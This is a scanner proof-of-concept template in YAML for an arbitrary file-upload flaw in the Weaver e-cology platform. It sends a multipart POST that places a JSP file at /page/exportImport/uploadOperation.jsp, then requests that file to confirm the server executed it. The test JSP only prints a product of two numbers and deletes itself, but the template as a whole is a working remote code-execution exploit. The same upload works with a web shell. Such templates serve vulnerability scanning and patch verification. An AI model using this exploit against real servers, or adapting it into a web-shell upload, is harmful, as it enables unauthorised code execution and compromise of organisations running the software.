detail:
  author: jingling(https://github.com/shmilylty)
  links:
  - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
expression: r0() && r1()
manual: true
name: poc-yaml-ecology-arbitrary-file-upload
rules:
  r0:
    expression: response.status == 200
    request:
      body: "--b0d829daa06c13d6b3e16b0ad21d1eed\r\nContent-Disposition: form-data;\
        \ name=\"file\"; filename=\"{{r1}}.jsp\"\r\nContent-Type: application/octet-stream\r\
        \n\r\n<%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\
        \n--b0d829daa06c13d6b3e16b0ad21d1eed--\r\n"
      cache: true
      headers:
        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
      method: POST
      path: /page/exportImport/uploadOperation.jsp
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r2
      * r3)))
    request:
      cache: true
      method: GET
      path: /page/exportImport/fileTransfer/{{r1}}.jsp
set:
  r1: randomLowercase(4)
  r2: randomInt(40000, 44800)
  r3: randomInt(40000, 44800)
transport: http
